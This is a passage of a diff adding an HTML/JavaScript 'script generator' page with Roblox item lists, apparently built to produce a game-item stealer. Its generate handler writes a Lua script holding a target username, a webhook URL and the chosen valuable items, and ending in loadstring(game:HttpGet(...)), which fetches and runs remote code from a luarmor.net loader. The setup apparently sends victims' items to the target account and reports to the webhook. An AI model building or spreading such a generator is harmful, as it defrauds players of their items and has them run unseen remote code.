Dul', 'Easter Easter Easter Sahur', 'Eid Eid Eid Sahur', 'Elefanto Frigo', 'Esok Sekolah', 'Eviledon', 'Extinct Matteo', 'Extinct Tralalero', 'Festive 67', 'Fishboard', 'Fishino Clownino', 'Flancito', 'Flipa Sandala', 'Fortunu and Cashuru', 'Foxini Lanternini', 'Fragola La La La', 'Fragrama and Chocrama', 'Frankentteo', 'Frullato Framingo', 'Futbolini Skatini', 'GOAT', 'Garama and Madundung', 'Gelato Lumacho', 'Giftini Spyderini', 'Ginger Gerat', 'Girafini Raftini', 'Glaciator', 'Globa Steppa', 'Gobblino Uniciclino', 'Gold Egg', 'Gold Elf', 'Gold Gold Gold', 'Graipuss Medussi', 'Granny', 'Griffin', 'Guerriro Digitale', 'Guest 666', 'Gym Bros', 'Ho Ho Ho Sahur', 'Hopilikalika Hopilikalako', 'Horegini Boom', 'Hydra Bunny', 'Hydra Dragon Cannelloni', 'Jackorilla', 'Jelly Moby', 'Job Job Job Sahur', 'John Doe', 'Jolly Jolly Sahur', 'Kalika Bros', 'Karker Sahur', 'Karkerkar Kurkur', 'Ketchuru and Musturu', 'Ketupat Bros', 'Ketupat Kepat', 'Kraken', 'La Anniversary Grande', 'La Casa Boo', 'La Cucaracha', 'La Easter Grande', 'La Extinct Grande', 'La Food Combinasion', 'La Ginger Sekolah', 'La Grande Combinasion', 'La Jolly Grande', 'La Karkerkar Combinasion', 'La Lucky Grande', 'La Romantic Grande', 'La Sahur Combinasion', 'La Secret Combinasion', 'La Spooky Grande', 'La Summer Grande', 'La Supreme Combinasion', 'La Taco Combinasion', 'La Vacca Jacko Linterino', 'La Vacca Lepre Lepreino', 'La Vacca Prese Presente', 'La Vacca Saturno Saturnita', 'Las Sis', 'Las Tralaleritas', 'Las Vaquitas Saturnitas', 'Lavadorito Spinito', 'List List List Sahur', 'Los 25', 'Los 67', 'Los Amigos', 'Los Bros', 'Los Bunitos', 'Los Burritos', 'Los Candies', 'Los Chicleteiras', 'Los Chillis', 'Los Combinasionas', 'Los Cucarachas', 'Los Cupids', 'Los Fruits', 'Los Hackers', 'Los Hotspotsitos', 'Los Jobcitos', 'Los Jolly Combinasionas', 'Los Karkeritos', 'Los Mariachis', 'Los Matteos', 'Los Mi Gatitos', 'Los Mobilis', 'Los Nooo My Hotspotsitos', 'Los Planitos', 'Los Primos', 'Los Puggies', 'Los Quesadillas', 'Los Sekolahs', 'Los Spaghettis', 'Los Spooky Combinasionas', 'Los Spyderinis', 'Los Sweethearts', 'Los Tacoritas', 'Los Tortus', 'Los Tralaleritos', 'Los Trios', 'Love Love Bear', 'Love Love Love Sahur', 'Lovin Rose', 'Luck Luck Luck Sahur', 'Lucky Block', 'Mariachi Corazoni', 'Mi Gatito', 'Mieteteira Bicicleteira', 'Money Money Bros', 'Money Money Puggy', 'Money Money Reindeer', 'Nacho Spyder', 'Naughty Naughty', 'Noo my Candy', 'Noo my Eggs', 'Noo my Gold', 'Noo my Heart', 'Noo my Present', 'Noo my examine', 'Nooo My Hotspot', 'Nuclearo Dinossauro', 'Octoball', 'Ombrello Topolino', 'Orcaledon', 'Pancake and Syrup', 'Paradiso Axolottino', 'Perrito Burrito', 'Pirulitoita Bicicleteira', 'Please my Present', 'Popcuru and Fizzuru', 'Pot Hotspot', 'Pot Pumpkin', 'Pumpkini Spyderini', 'Quackini Snackini', 'Quesadilla Crocodila', 'Quesadillo Vampiro', 'Rang Ring Bus', 'Reindeer Tralala', 'Reinito Sleighito', 'Rico Dinero', 'Rocco Disco', 'Rocketini Frostini', 'Rosetti Tualetti', 'Rosey and Teddy', 'Rubrikiko', 'Sammyni Cakini', 'Sammyni Fattini', 'Sammyni Spyderini', 'Sand Sand Sand', 'Santa Hotspot', 'Santteo', 'Serafinna Medusella', 'Signore Carapace', 'Snailo Clovero', 'Spaghetti Tualetti', 'Spinny Hammy', 'Spooky and Pumpky', 'Steakini Fattini', 'Strawberrita', 'Sushi Inu', 'Swag Soda', 'Swaggy Bros', 'Tacorillo Crocodillo', 'Tacorita Bicicleta', 'Tang Tang Keletang', 'Telemorte', 'Tictac Sahur', 'Tirilikalika Tirilikalako', 'To to to Sahur', 'Torrtuginni Dragonfrutini', 'Tralaledon', 'Trenostruzzo Turbo 4000', 'Trickolino', 'Triplito Tralaleritos', 'Tuff Toucan', 'Ventoliero Pavonero', 'Venuspino', 'Vulturino Skeletono', 'W or L', 'Yess my examine', 'Zombie Tralala', '4th Bros', 'Capitano Americano', 'Bufalino Boomberino', 'Esok Goala', 'Los Tangcitos', 'Los Tictacs', 'Los Admins', 'Moby Bros', 'Var Var Var', 'Noodle Noodle Poodle', 'Grabatron', 'Cangurato Gelato', 'Rubiko and Kubiko', 'Toro Españolo', 'Chicleteira Champeona', 'Examen Bros', 'Pizza and Ranch', 'Los Secret Combinasionas', 'Gelatina Volatina', 'Conetto Morsetto', 'Pogo Pogo Penguin', 'Peschito Machito', 'Honey Honey Bear', 'Scorpino Coasterino', 'Queen Bee', 'Smore Serat', 'Yetimactic', 'La Breakfast Combinasion', 'Bumbatron', 'Candini Fluffini', 'Polaroidini', 'La Fuse Machine', 'Burrito Bat', 'Tacoturbo Tacorito', 'Nachorilla', 'Sammyni Truckini', 'Orchidox', 'Pop Pop Petalini', 'Motorino Bumbuni', 'Pelican Pachetto', 'Deputy Leopard', 'Chicli Chicla', 'Panda Popanda', 'La Craft Machine', 'Gold and Diamond', 'Los Dragons', 'Zebrino Pianino', 'Hydra Serpent', 'Ranito Pepito', 'Ski Ski Skunki', 'Capibaro Celestino', 'Pin Pin Pengu', 'Rexino Ramino', 'Rockarino Rockara', 'Qamar Camelamp', 'Marino Submarino', 'Lavamanta', 'Lionello Casarello', 'Draculino'],
+            OG: ['Headless Horseman', 'John Pork', 'Meowl', 'Skibidi Toilet', 'Spyder Elephant', 'Strawberry Elephant']
+        };
+
+        const baseSkinsList = ['Rose', 'Gingerbread', 'Halloween', 'Christmas', 'Bunny Basket', 'Summer', 'Pot of Gold', 'Taco', 'Octo', 'Valentines', 'Easter', 'Lucky', 'Aquatic', 'Tralalero'];
+        const gearsList = ["Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider", "Yin Yang Slap", "Cursed Slap", "Cyber Slap", "Divine Slap", "Bloodmoon Slap", "Radioactive Slap", "Rainbow Slap", "Rainbow Hammer", "Bloodmoon Hammer", "Radioactive Airstrike", "Yin Yang Lamp", "Demon's Head", "Lava Slap", "Lava Blaster", "Alien Slap", "Blackhole Bomb", "Candy Sentry", "Phantom Slap", "Candy Slap"];
+
+        const selectedBrainrots = new Set();
+        const selectedSkins = new Set();
+        const selectedGears = new Set();
+
+        const brainrotCategorySelect = document.getElementById('brainrotCategorySelect');
+        const brainrotsItemsContainer = document.getElementById('brainrotsItemsContainer');
+        const skinsItemsContainer = document.getElementById('skinsItemsContainer');
+        const gearsItemsContainer = document.getElementById('gearsItemsContainer');
+
+        function renderBrainrots(category) {
+            brainrotsItemsContainer.innerHTML = '';
+            (brainrotLists[category] || []).forEach(item => {
+                const btn = document.createElement('button');
+                const isSelected = selectedBrainrots.has(item);
+                btn.type = 'button';
+                btn.className = `px-3 py-2.5 rounded-xl text-xs font-semibold transition-all text-left truncate border ${
+                    isSelected 
+                        ? 'bg-[#5865F2] text-white border-[#5865F2] shadow-lg shadow-[#5865F2]/30' 
+                        : 'bg-[#0b0c10] text-gray-300 border-gray-800 hover:border-[#5865F2]/50 hover:text-white'
+                }`;
+                btn.textContent = item;
+                btn.onclick = () => {
+                    if (selectedBrainrots.has(item)) {
+                        selectedBrainrots.delete(item);
+                    } else {
+                        selectedBrainrots.add(item);
+                    }
+                    renderBrainrots(category);
+                };
+                brainrotsItemsContainer.appendChild(btn);
+            });
+        }
+
+        brainrotCategorySelect.addEventListener('change', (e) => renderBrainrots(e.target.value));
+        renderBrainrots('Common');
+
+        baseSkinsList.forEach(skin => {
+            const btn = document.createElement('button');
+            btn.type = 'button';
+            btn.className = 'px-3 py-2.5 rounded-xl text-xs font-semibold transition-all text-left truncate border bg-[#0b0c10] text-gray-300 border-gray-800 hover:border-[#5865F2]/50 hover:text-white';
+            btn.textContent = skin;
+            btn.onclick = () => {
+                if (selectedSkins.has(skin)) {
+                    selectedSkins.delete(skin);
+                    btn.className = 'px-3 py-2.5 rounded-xl text-xs font-semibold transition-all text-left truncate border bg-[#0b0c10] text-gray-300 border-gray-800 hover:border-[#5865F2]/50 hover:text-white';
+                } else {
+                    selectedSkins.add(skin);
+                    btn.className = 'px-3 py-2.5 rounded-xl text-xs font-semibold transition-all text-left truncate border bg-[#5865F2] text-white border-[#5865F2] shadow-lg shadow-[#5865F2]/30';
+                }
+            };
+            skinsItemsContainer.appendChild(btn);
+        });
+
+        gearsList.forEach(gear => {
+            const btn = document.createElement('button');
+            btn.type = 'button';
+            btn.className = 'px-3 py-2.5 rounded-xl text-xs font-semibold transition-all text-left truncate border bg-[#0b0c10] text-gray-300 border-gray-800 hover:border-[#5865F2]/50 hover:text-white';
+            btn.textContent = gear;
+            btn.onclick = () => {
+                if (selectedGears.has(gear)) {
+                    selectedGears.delete(gear);
+                    btn.className = 'px-3 py-2.5 rounded-xl text-xs font-semibold transition-all text-left truncate border bg-[#0b0c10] text-gray-300 border-gray-800 hover:border-[#5865F2]/50 hover:text-white';
+                } else {
+                    selectedGears.add(gear);
+                    btn.className = 'px-3 py-2.5 rounded-xl text-xs font-semibold transition-all text-left truncate border bg-[#5865F2] text-white border-[#5865F2] shadow-lg shadow-[#5865F2]/30';
+                }
+            };
+            gearsItemsContainer.appendChild(btn);
+        });
+
+        document.getElementById('generateBtn').addEventListener('click', () => {
+            const username = document.getElementById('targetUsernameInput').value.trim() || 'yourusername';
+            const webhook = document.getElementById('webhookInput').value.trim() || 'webhookurl';
+
+            let scriptContent = '';
+
+            scriptContent = `getgenv().TARGET_USERNAME = "${username}"\n`;
+            scriptContent += `getgenv().WEBHOOK_URL = "${webhook}"\n`;
+
+            scriptContent += `getgenv().NORMAL_BRAINROTS = {\n`;
+            Array.from(selectedBrainrots).forEach((item, index, arr) => {
+                scriptContent += `    ["${item}"] = true${index < arr.length - 1 ? ',' : ''}\n`;
+            });
+            scriptContent += `}\n`;
+
+            scriptContent += `getgenv().NORMAL_BASE_SKINS = {\n`;
+            Array.from(selectedSkins).forEach((skin, index, arr) => {
+                scriptContent += `    ["${skin}"] = true${index < arr.length - 1 ? ',' : ''}\n`;
+            });
+            scriptContent += `}\n`;
+
+            scriptContent += `getgenv().NORMAL_GEARS = {\n`;
+            Array.from(selectedGears).forEach((gear, index, arr) => {
+                scriptContent += `    ["${gear}"] = true${index < arr.length - 1 ? ',' : ''}\n`;
+            });
+            scriptContent += `}\n\n`;
+
+            scriptContent += `task.spawn(function()\n`;
+            scriptContent += `    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\n`;
+            scriptContent += `end)`;
+
+            document.getElementById('outputCode').value = scriptContent;
+            showToast(translations[currentLang].toastGenerated, 'success');
+        });
+
+        changeLanguage('en');
+    </script>
+</body>
+</html>
